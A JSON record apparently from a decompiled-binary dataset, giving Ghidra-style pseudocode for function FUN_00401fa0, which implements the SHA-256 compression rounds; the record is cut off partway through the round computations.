{"Function Name": "FUN_00401fa0", "Address": "00401fa0", "Source Code": "undefined8 FUN_00401fa0(long param_1,uint *param_2)\n{\nint *piVar1;\nint iVar2;\nlong lVar3;\nuint *puVar4;\nuint *puVar5;\nuint uVar6;\nuint uVar7;\nuint uVar8;\nuint uVar9;\nuint uVar10;\nuint uVar11;\nuint uVar12;\nuint uVar13;\nuint uVar14;\nuint local_158 [74];\n\nlVar3 = 0;\ndo {\n*(undefined4 *)((long)local_158 + lVar3) = *(undefined4 *)(param_1 + 8 + lVar3);\nlVar3 = lVar3 + 4;\n} while (lVar3 != 0x20);\niVar2 = 0;\ndo {\nuVar7 = *param_2;\nlVar3 = (long)iVar2;\niVar2 = iVar2 + 1;\nparam_2 = param_2 + 1;\nlocal_158[lVar3 + 8] =\nuVar7 >> 0x18 | (uVar7 & 0xff0000) >> 8 | (uVar7 & 0xff00) << 8 | uVar7 << 0x18;\n} while (iVar2 != 0x10);\npuVar4 = local_158 + 0x16;\ndo {\nuVar7 = *puVar4;\nuVar6 = puVar4[-0xd];\npuVar5 = puVar4 + 1;\npuVar4[2] = ((uVar6 >> 0x12 | uVar6 << 0xe) ^ (uVar6 >> 7 | uVar6 << 0x19) ^ uVar6 >> 3) +\n((uVar7 >> 0x13 | uVar7 << 0xd) ^ (uVar7 >> 0x11 | uVar7 << 0xf) ^ uVar7 >> 10) +\npuVar4[-0xe] + puVar4[-5];\npuVar4 = puVar5;\n} while (puVar5 != local_158 + 0x46);\niVar2 = local_158[7] + local_158[8] + 0x428a2f98 +\n((local_158[6] ^ local_158[5]) & local_158[4] ^ local_158[6]) +\n((local_158[4] >> 0xb | local_158[4] << 0x15) ^ (local_158[4] >> 6 | local_158[4] << 0x1a)\n^ (local_158[4] >> 0x19 | local_158[4] << 7));\nuVar9 = local_158[3] + iVar2;\nuVar13 = ((local_158[1] | local_158[0]) & local_158[2] | local_158[1] & local_158[0]) +\n((local_158[0] >> 0xd | local_158[0] << 0x13) ^\n(local_158[0] >> 2 | local_158[0] << 0x1e) ^ (local_158[0] >> 0x16 | local_158[0] << 10)\n) + iVar2;\niVar2 = local_158[6] + local_158[9] + 0x71374491 +\n((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^\n(uVar9 >> 0x19 | uVar9 * 0x80)) + ((local_158[5] ^ local_158[4]) & uVar9 ^ local_158[5]);\nuVar7 = iVar2 + local_158[2];\nuVar12 = iVar2 + ((uVar13 | local_158[0]) & local_158[1] | uVar13 & local_158[0]) +\n((uVar13 >> 0xd | uVar13 * 0x80000) ^ (uVar13 >> 2 | uVar13 * 0x40000000) ^\n(uVar13 >> 0x16 | uVar13 * 0x400));\niVar2 = local_158[5] + local_158[10] + -0x4a3f0431 +\n((uVar7 >> 0xb | uVar7 * 0x200000) ^ (uVar7 >> 6 | uVar7 * 0x4000000) ^\n(uVar7 >> 0x19 | uVar7 * 0x80)) + ((uVar9 ^ local_158[4]) & uVar7 ^ local_158[4]);\nuVar8 = local_158[1] + iVar2;\nuVar11 = ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n(uVar12 >> 0x16 | uVar12 * 0x400)) + iVar2 +\n((uVar12 | uVar13) & local_158[0] | uVar12 & uVar13);\niVar2 = local_158[4] + local_158[0xb] + -0x164a245b +\n((uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^\n(uVar8 >> 0x19 | uVar8 * 0x80)) + ((uVar7 ^ uVar9) & uVar8 ^ uVar9);\nuVar6 = local_158[0] + iVar2;\nuVar10 = ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n(uVar11 >> 0x16 | uVar11 * 0x400)) + iVar2 +\n((uVar11 | uVar12) & uVar13 | uVar11 & uVar12);\niVar2 = uVar9 + local_158[0xc] + 0x3956c25b +\n((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 >> 6 | uVar6 * 0x4000000) ^\n(uVar6 >> 0x19 | uVar6 * 0x80)) + ((uVar8 ^ uVar7) & uVar6 ^ uVar7);\nuVar13 = uVar13 + iVar2;\nuVar9 = ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n(uVar10 >> 0x16 | uVar10 * 0x400)) + iVar2 +\n((uVar10 | uVar11) & uVar12 | uVar10 & uVar11);\niVar2 = uVar7 + local_158[0xd] + 0x59f111f1 +\n((uVar13 >> 0xb | uVar13 * 0x200000) ^ (uVar13 >> 6 | uVar13 * 0x4000000) ^\n(uVar13 >> 0x19 | uVar13 * 0x80)) + ((uVar6 ^ uVar8) & uVar13 ^ uVar8);\nuVar12 = uVar12 + iVar2;\nuVar14 = ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^\n(uVar9 >> 0x16 | uVar9 * 0x400)) + iVar2 + ((uVar9 | uVar10) & uVar11 | uVar9 & uVar10);\niVar2 = uVar8 + local_158[0xe] + -0x6dc07d5c +\n((uVar12 >> 0xb | uVar12 * 0x200000) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^\n(uVar12 >> 0x19 | uVar12 * 0x80)) + ((uVar13 ^ uVar6) & uVar12 ^ uVar6);\nuVar11 = uVar11 + iVar2;\nuVar8 = ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n(uVar14 >> 0x16 | uVar14 * 0x400)) + iVar2 + ((uVar14 | uVar9) & uVar10 | uVar14 & uVar9);\niVar2 = uVar6 + local_158[0xf] + -0x54e3a12b +\n((uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^\n(uVar11 >> 0x19 | uVar11 * 0x80)) + ((uVar12 ^ uVar13) & uVar11 ^ uVar13);\nuVar10 = uVar10 + iVar2;\nuVar7 = ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^\n(uVar8 >> 0x16 | uVar8 * 0x400)) + iVar2 + ((uVar8 | uVar14) & uVar9 | uVar8 & uVar14);\niVar2 = uVar13 + local_158[0x10] + -0x27f85568 +\n((uVar10 >> 0xb | uVar10 * 0x200000) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^\n(uVar10 >> 0x19 | uVar10 * 0x80)) + ((uVar11 ^ uVar12) & uVar10 ^ uVar12);\nuVar9 = uVar9 + iVar2;\nuVar13 = ((uVar7 >> 0xd | uVar7 * 0x80000) ^ (uVar7 >> 2 | uVar7 * 0x40000000) ^\n(uVar7 >> 0x16 | uVar7 * 0x400)) + iVar2 + ((uVar7 | uVar8) & uVar14 | uVar7 & uVar8);\niVar2 = uVar12 + local_158[0x11] + 0x12835b01 +\n((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^\n(uVar9 >> 0x19 | uVar9 * 0x80)) + ((uVar10 ^ uVar11) & uVar9 ^ uVar11);\nuVar14 = uVar14 + iVar2;\nuVar12 = ((uVar13 >> 0xd | uVar13 * 0x80000) ^ (uVar13 >> 2 | uVar13 * 0x40000000) ^\n(uVar13 >> 0x16 | uVar13 * 0x400)) + iVar2 + ((uVar13 | uVar7) & uVar8 | uVar13 & uVar7);\niVar2 = uVar11 + local_158[0x12] + 0x243185be +\n((uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^\n(uVar14 >> 0x19 | uVar14 * 0x80)) + ((uVar9 ^ uVar10) & uVar14 ^ uVar10);\nuVar8 = uVar8 + iVar2;\nuVar11 = ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n(uVar12 >> 0x16 | uVar12 * 0x400)) + iVar2 +\n((uVar12 | uVar13) & uVar7 | uVar12 & uVar13);\niVar2 = uVar10 + local_158[0x13] + 0x550c7dc3 +\n((uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^\n(uVar8 >> 0x19 | uVar8 * 0x80)) + ((uVar14 ^ uVar9) & uVar8 ^ uVar9);\nuVar7 = uVar7 + iVar2;\nuVar10 = ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n(uVar11 >> 0x16 | uVar11 * 0x400)) + iVar2 +\n((uVar11 | uVar12) & uVar13 | uVar11 & uVar12);\niVar2 = uVar9 + local_158[0x14] + 0x72be5d74 +\n((uVar7 >> 0xb | uVar7 * 0x200000) ^ (uVar7 >> 6 | uVar7 * 0x4000000) ^\n(uVar7 >> 0x19 | uVar7 * 0x80)) + ((uVar8 ^ uVar14) & uVar7 ^ uVar14);\nuVar13 = uVar13 + iVar2;\nuVar9 = ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n(uVar10 >> 0x16 | uVar10 * 0x400)) + iVar2 +\n((uVar10 | uVar11) & uVar12 | uVar10 & uVar11);\niVar2 = uVar14 + local_158[0x15] + -0x7f214e02 +\n((uVar13 >> 0xb | uVar13 * 0x200000) ^ (uVar13 >> 6 | uVar13 * 0x4000000) ^\n(uVar13 >> 0x19 | uVar13 * 0x80)) + ((uVar7 ^ uVar8) & uVar13 ^ uVar8);\nuVar12 = uVar12 + iVar2;\nuVar14 = ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^\n(uVar9 >> 0x16 | uVar9 * 0x400)) + iVar2 + ((uVar9 | uVar10) & uVar11 | uVar9 & uVar10);\niVar2 = uVar8 + local_158[0x16] + -0x6423f959 +\n((uVar12 >> 0xb | uVar12 * 0x200000) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^\n(uVar12 >> 0x19 | uVar12 * 0x80)) + ((uVar13 ^ uVar7) & uVar12 ^ uVar7);\nuVar11 = uVar11 + iVar2;\nuVar6 = ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n(uVar14 >> 0x16 | uVar14 * 0x400)) + iVar2 + ((uVar14 | uVar9) & uVar10 | uVar14 & uVar9);\niVar2 = uVar7 + local_158[0x17] + -0x3e640e8c +\n((uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^\n(uVar11 >> 0x19 | uVar11 * 0x80)) + ((uVar12 ^ uVar13) & uVar11 ^ uVar13);\nuVar10 = uVar10 + iVar2;\nuVar7 = ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 >> 2 | uVar6 * 0x40000000) ^\n(uVar6 >> 0x16 | uVar6 * 0x400)) + iVar2 + ((uVar6 | uVar14) & uVar9 | uVar6 & uVar14);\niVar2 = uVar13 + local_158[0x18] + -0x1b64963f +\n((uVar10 >> 0xb | uVar10 * 0x200000) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^\n(uVar10 >> 0x19 | uVar10 * 0x80)) + ((uVar11 ^ uVar12) & uVar10 ^ uVar12);\nuVar9 = uVar9 + iVar2;\nuVar13 = ((uVar7 >> 0xd | uVar7 * 0x80000) ^ (uVar7 >> 2 | uVar7 * 0x40000000) ^\n(uVar7 >> 0x16 | uVar7 * 0x400)) + iVar2 + ((uVar7 | uVar6) & uVar14 | uVar7 & uVar6);\niVar2 = uVar12 + local_158[0x19] + -0x1041b87a +\n((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^\n(uVar9 >> 0x19 | uVar9 * 0x80)) + ((uVar10 ^ uVar11) & uVar9 ^ uVar11);\nuVar14 = uVar14 + iVar2;\nuVar12 = ((uVar13 >> 0xd | uVar13 * 0x80000) ^ (uVar13 >> 2 | uVar13 * 0x40000000) ^\n(uVar13 >> 0x16 | uVar13 * 0x400)) + iVar2 + ((uVar13 | uVar7) & uVar6 | uVar13 & uVar7);\niVar2 = uVar11 + local_158[0x1a] + 0xfc19dc6 +\n((uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^\n(uVar14 >> 0x19 | uVar14 * 0x80)) + ((uVar9 ^ uVar10) & uVar14 ^ uVar10);\nuVar6 = uVar6 + iVar2;\nuVar11 = ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n(uVar12 >> 0x16 | uVar12 * 0x400)) + iVar2 +\n((uVar12 | uVar13) & uVar7 | uVar12 & uVar13);\niVar2 = uVar10 + local_158[0x1b] + 0x240ca1cc +\n((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 >> 6 | uVar6 * 0x4000000) ^\n(uVar6 >> 0x19 | uVar6 * 0x80)) + ((uVar14 ^ uVar9) & uVar6 ^ uVar9);\nuVar7 = uVar7 + iVar2;\nuVar10 = ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n(uVar11 >> 0x16 | uVar11 * 0x400)) + iVar2 +\n((uVar11 | uVar12) & uVar13 | uVar11 & uVar12);\niVar2 = uVar9 + local_158[0x1c] + 0x2de92c6f +\n((uVar7 >> 0xb | uVar7 * 0x200000) ^ (uVar7 >> 6 | uVar7 * 0x4000000) ^\n(uVar7 >> 0x19 | uVar7 * 0x80)) + ((uVar6 ^ uVar14) & uVar7 ^ uVar14);\nuVar13 = uVar13 + iVar2;\nuVar8 = ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n(uVar10 >> 0x16 | uVar10 * 0x400)) + iVar2 +\n((uVar10 | uVar11) & uVar12 | uVar10 & uVar11);\niVar2 = uVar14 + local_158[0x1d] + 0x4a7484aa +\n((uVar13 >> 0xb | uVar13 * 0x200000) ^ (uVar13 >> 6 | uVar13 * 0x4000000) ^\n(uVar13 >> 0x19 | uVar13 * 0x80)) + ((uVar7 ^ uVar6) & uVar13 ^ uVar6);\nuVar12 = uVar12 + iVar2;\nuVar14 = ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^\n(uVar8 >> 0x16 | uVar8 * 0x400)) + iVar2 + ((uVar8 | uVar10) & uVar11 | uVar8 & uVar10);\niVar2 = uVar6 + local_158[0x1e] + 0x5cb0a9dc +\n((uVar12 >> 0xb | uVar12 * 0x200000) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^\n(uVar12 >> 0x19 | uVar12 * 0x80)) + ((uVar13 ^ uVar7) & uVar12 ^ uVar7);\nuVar11 = uVar11 + iVar2;\nuVar6 = ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n(uVar14 >> 0x16 | uVar14 * 0x400)) + iVar2 + ((uVar14 | uVar8) & uVar10 | uVar14 & uVar8);\niVar2 = uVar7 + local_158[0x1f] + 0x76f988da +\n((uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^\n(uVar11 >> 0x19 | uVar11 * 0x80)) + ((uVar12 ^ uVar13) & uVar11 ^ uVar13);\nuVar10 = uVar10 + iVar2;\nuVar7 = ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 >> 2 | uVar6 * 0x40000000) ^\n(uVar6 >> 0x16 | uVar6 * 0x400)) + iVar2 + ((uVar6 | uVar14) & uVar8 | uVar6 & uVar14);\niVar2 = uVar13 + local_158[0x20] + -0x67c1aeae +\n((uVar10 >> 0xb | uVar10 * 0x200000) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^\n(uVar10 >> 0x19 | uVar10 * 0x80)) + ((uVar11 ^ uVar12) & uVar10 ^ uVar12);\nuVar8 = uVar8 + iVar2;\nuVar13 = ((uVar7 >> 0xd | uVar7 * 0x80000) ^ (uVar7 >> 2 | uVar7 * 0x40000000) ^\n(uVar7 >> 0x16 | uVar7 * 0x400)) + iVar2 + ((uVar7 | uVar6) & uVar14 | uVar7 & uVar6);\niVar2 = uVar12 + local_158[0x21] + -0x57ce3993 +\n((uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^\n(uVar8 >> 0x19 | uVar8 * 0x80)) + ((uVar10 ^ uVar11) & uVar8 ^ uVar11);\nuVar14 = uVar14 + iVar2;\nuVar12 = ((uVar13 >> 0xd | uVar13 * 0x80000) ^ (uVar13 >> 2 | uVar13 * 0x40000000) ^\n(uVar13 >> 0x16 | uVar13 * 0x400)) + iVar2 + ((uVar13 | uVar7) & uVar6 | uVar13 & uVar7);\niVar2 = uVar11 + local_158[0x22] + -0x4ffcd838 +\n((uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^\n(uVar14 >> 0x19 | uVar14 * 0x80)) + ((uVar8 ^ uVar10) & uVar14 ^ uVar10);\nuVar6 = uVar6 + iVar2;\nuVar11 = ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n(uVar12 >> 0x16 | uVar12 * 0x400)) + iVar2 +\n((uVar12 | uVar13) & uVar7 | uVar12 & uVar13);\niVar2 = uVar10 + local_158[0x23] + -0x40a68039 +\n((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 >> 6 | uVar6 * 0x4000000) ^\n(uVar6 >> 0x19 | uVar6 * 0x80)) + ((uVar14 ^ uVar8) & uVar6 ^ uVar8);\nuVar7 = uVar7 + iVar2;\nuVar9 = ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n(uVar11 >> 0x16 | uVar11 * 0x400)) + iVar2 +\n((uVar11 | uVar12) & uVar13 | uVar11 & uVar12);\niVar2 = uVar8 + local_158[0x24] + -0x391ff40d +\n((uVar7 >> 0xb | uVar7 * 0x200000) ^ (uVar7 >> 6 | uVar7 * 0x4000000) ^\n(uVar7 >> 0x19 | uVar7 * 0x80)) + ((uVar6 ^ uVar14) & uVar7 ^ uVar14);\nuVar13 = uVar13 + iVar2;\nuVar8 = ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^\n(uVar9 >> 0x16 | uVar9 * 0x400)) + iVar2 + ((uVar9 | uVar11) & uVar12 | uVar9 & uVar11);\niVar2 = uVar14 + local_158[0x25] + -0x2a586eb9 +\n((uVar13 >> 0xb | uVar13 * 0x200000) ^ (uVar13 >> 6 | uVar13 * 0x4000000) ^\n(uVar13 >> 0x19 | uVar13 * 0x80)) + ((uVar7 ^ uVar6) & uVar13 ^ uVar6);\nuVar12 = uVar12 + iVar2;\nuVar14 = ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^\n(uVar8 >> 0x16 | uVar8 * 0x400)) + iVar2 + ((uVar8 | uVar9) & uVar11 | uVar8 & uVar9);\niVar2 = uVar6 + local_158[0x26] + 0x6ca6351 +\n((uVar12 >> 0xb | uVar12 * 0x200000) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^\n(uVar12 >> 0x19 | uVar12 * 0x80)) + ((uVar13 ^ uVar7) & uVar12 ^ uVar7);\nuVar11 = uVar11 + iVar2;\nuVar6 = ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n(uVar14 >> 0x16 | uVar14 * 0x400)) + iVar2 + ((uVar14 | uVar8) & uVar9 | uVar14 & uVar8);\niVar2 = uVar7 + local_158[0x27] + 0x14292967 +\n((uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^\n(uVar11 >> 0x19 | uVar11 * 0x80)) + ((uVar12 ^ uVar13) & uVar11 ^ uVar13);\nuVar9 = uVar9 + iVar2;\nuVar7 = ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 >> 2 | uVar6 * 0x40000000) ^\n(uVar6 >> 0x16 | uVar6 * 0x400)) + iVar2 + ((uVar6 | uVar14) & uVar8 | uVar6 & uVar14);\niVar2 = uVar13 + local_158[0x28] + 0x27b70a85 +\n((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^\n(uVar9 >> 0x19 | uVar9 * 0x80)) + ((uVar11 ^ uVar12) & uVar9 ^ uVar12);\nuVar8 = uVar8 + iVar2;\nuVar13 = ((uVar7 >> 0xd | uVar7 * 0x80000) ^ (uVar7 >> 2 | uVar7 * 0x40000000) ^\n(uVar7 >> 0x16 | uVar7 * 0x400)) + iVar2 + ((uVar7 | uVar6) & uVar14 | uVar7 & uVar6);\niVar2 = uVar12 + local_158[0x29] + 0x2e1b2138 +\n((uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^\n(uVar8 >> 0x19 | uVar8 * 0x80)) + ((uVar9 ^ uVar11) & uVar8 ^ uVar11);\nuVar14 = uVar14 + iVar2;\nuVar12 = ((uVar13 >> 0xd | uVar13 * 0x80000) ^ (uVar13 >> 2 | uVar13 * 0x40000000) ^\n(uVar13 >> 0x16 | uVar13 * 0x400)) + iVar2 + ((uVar13 | uVar7) & uVar6 | uVar13 & uVar7);\niVar2 = uVar11 + local_158[0x2a] + 0x4d2c6dfc +\n((uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^\n(uVar14 >> 0x19 | uVar14 * 0x80)) + ((uVar8 ^ uVar9) & uVar14 ^ uVar9);\nuVar6 = uVar6 + iVar2;\nuVar10 = ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n(uVar12 >> 0x16 | uVar12 * 0x400)) + iVar2 +\n((uVar12 | uVar13) & uVar7 | uVar12 & uVar13);\niVar2 = uVar9 + local_158[0x2b] + 0x53380d13 +\n((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 >> 6 | uVar6 * 0x4000000) ^\n(uVar6 >> 0x19 | uVar6 * 0x80)) + ((uVar14 ^ uVar8) & uVar6 ^ uVar8);\nuVar7 = uVar7 + iVar2;\nuVar9 = ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n(uVar10 >> 0x16 | uVar10 * 0x400)) + iVar2 +\n((uVar10 | uVar12) & uVar13 | uVar10 & uVar12);\niVar2 = uVar8 + local_158[0x2c] + 0x650a7354 +\n((uVar7 >> 0xb | uVar7 * 0x200000) ^ (uVar7 >> 6 | uVar7 * 0x4000000) ^\n(uVar7 >> 0x19 | uVar7 * 0x80)) + ((uVar6 ^ uVar14) & uVar7 ^ uVar14);\nuVar13 = uVar13 + iVar2;\nuVar8 = ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^\n(uVar9 >> 0x16 | uVar9 * 0x400)) + iVar2 + ((uVar9 | uVar10) & uVar12 | uVar9 & uVar10);\niVar2 = uVar14 + local_158[0x2d] + 0x766a0abb +\n((uVar13 >> 0xb | uVar13 * 0x200000) ^ (uVar13 >> 6 | uVar13 * 0x4000000) ^\n(uVar13 >> 0x19 | uVar13 * 0x80)) + ((uVar7 ^ uVar6) & uVar13 ^ uVar6);\nuVar12 = uVar12 + iVar2;\nuVar14 = ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^\n(uVar8 >> 0x16 | uVar8 * 0x400)) + iVar2 + ((uVar8 | uVar9) & uVar10 | uVar8 & uVar9);\niVar2 = uVar6 + local_158[0x2e] + -0x7e3d36d2 +\n((uVar12 >> 0xb | uVar12 * 0x200000) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^\n(uVar12 >> 0x19 | uVar12 * 0x80)) + ((uVar13 ^ uVar7) & uVar12 ^ uVar7);\nuVar10 = uVar10 + iVar2;\nuVar6 = ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n(uVar14 >> 0x16 | uVar14 * 0x400)) + iVar2 + ((uVar14 | uVar8) & uVar9 | uVar14 & uVar8);\niVar2 = uVar7 + local_158[0x2f] + -0x6d8dd37b +\n((uVar10 >> 0xb | uVar10 * 0x200000) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^\n(uVar10 >> 0x19 | uVar10 * 0x80)) + ((uVar12 ^ uVar13) & uVar10 ^ uVar13);\nuVar9 = uVar9 + iVar2;\nuVar7 = ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 >> 2 | uVar6 * 0x40000000) ^\n(uVar6 >> 0x16 | uVar6 * 0x400)) + iVar2 + ((uVar6 | uVar14) & uVar8 | uVar6 & uVar14);\niVar2 = uVar13 + local_158[0x30] + -0x5d40175f +\n((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^\n(uVar9 >> 0x19 | uVar9 * 0x80)) + ((uVar10 ^ uVar12) & uVar9 ^ uVar12);\nuVar8 = uVar8 + iVar2;\nuVar13 = ((uVar7 >> 0xd | uVar7 * 0x80000) ^ (uVar7 >> 2 | uVar7 * 0x40000000) ^\n(uVar7 >> 0x16 | uVar7 * 0x400)) + iVar2 + ((uVar7 | uVar6) & uVar14 | uVar7 & uVar6);\niVar2 = uVar12 + local_158[0x31] + -0x57e599b5 +\n((uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^\n(uVar8 >> 0x19 | uVar8 * 0x80)) + ((uVar9 ^ uVar10) & uVar8 ^ uVar10);\nuVar14 = uVar14 + iVar2;\nuVar11 = ((uVar13 >> 0xd | uVar13 * 0x80000) ^ (uVar13 >> 2 | uVar13 * 0x40000000) ^\n(uVar13 >> 0x16 | uVar13 * 0x400)) + iVar2 + ((uVar13 | uVar7) & uVar6 | uVar13 & uVar7);\niVar2 = uVar10 + local_158[0x32] + -0x3db47490 +\n((uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^\n(uVar14 >> 0x19 | uVar14 * 0x80)) + ((uVar8 ^ uVar9) & uVar14 ^ uVar9);\nuVar6 = uVar6 + iVar2;\nuVar10 = ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n(uVar11 >> 0x16 | uVar11 * 0x400)) + iVar2 +\n((uVar11 | uVar13) & uVar7 | uVar11 & uVar13);\niVar2 = uVar9 + local_158[0x33] + -0x3893ae5d +\n((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 >> 6 | uVar6 * 0x4000000) ^\n(uVar6 >> 0x19 | uVar6 * 0x80)) + ((uVar14 ^ uVar8) & uVar6 ^ uVar8);\nuVar7 = uVar7 + iVar2;\nuVar9 = ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n(uVar10 >> 0x16 | uVar10 * 0x400)) + iVar2 +\n((uVar10 | uVar11) & uVar13 | uVar10 & uVar11);\niVar2 = uVar8 + local_158[0x34] + -0x2e6d17e7 +\n((uVar7 >> 0xb | uVar7 * 0x200000) ^ (uVar7 >> 6 | uVar7 * 0x4000000) ^\n(uVar7 >> 0x19 | uVar7 * 0x80)) + ((uVar6 ^ uVar14) & uVar7 ^ uVar14);\nuVar13 = uVar13 + iVar2;\nuVar8 = ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^\n(uVar9 >> 0x16 | uVar9 * 0x400)) + iVar2 + ((uVar9 | uVar10) & uVar11 | uVar9 & uVar10);\niVar2 = uVar14 + local_158[0x35] + -0x2966f9dc +\n((uVar13 >> 0xb | uVar13 * 0x200000) ^ (uVar13 >> 6 | uVar13 * 0x4000000) ^\n(uVar13 >> 0x19 | uVar13 * 0x80)) + ((uVar7 ^ uVar6) & uVar13 ^ uVar6);\nuVar11 = uVar11 + iVar2;\nuVar14 = ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^\n(uVar8 >> 0x16 | uVar8 * 0x400)) + iVar2 + ((uVar8 | uVar9) & uVar10 | uVar8 & uVar9);\niVar2 = uVar6 + local_158[0x36] + -0xbf1ca7b +\n((uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^\n(uVar11 >> 0x19 | uVar11 * 0x80)) + ((uVar13 ^ uVar7) & uVar11 ^ uVar7);\nuVar10 = uVar10 + iVar2;\nuVar6 = ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n(uVar14 >> 0x16 | uVar14 * 0x400)) + iVar2 + ((uVar14 | uVar8) & uVar9 | uVar14 & uVar8);\niVar2 = uVar7 + local_158[0x37] + 0x106aa070 +\n((uVar10 >> 0xb | uVar10 * 0x200000) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^\n(uVar10 >> 0x19 | uVar10 * 0x80)) + ((uVar11 ^ uVar13) & uVar10 ^ uVar13);\nuVar9 = uVar9 + iVar2;\nuVar7 = ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 >> 2 | uVar6 * 0x40000000) ^\n(uVar6 >> 0x16 | uVar6 * 0x400)) + iVar2 + ((uVar6 | uVar14) & 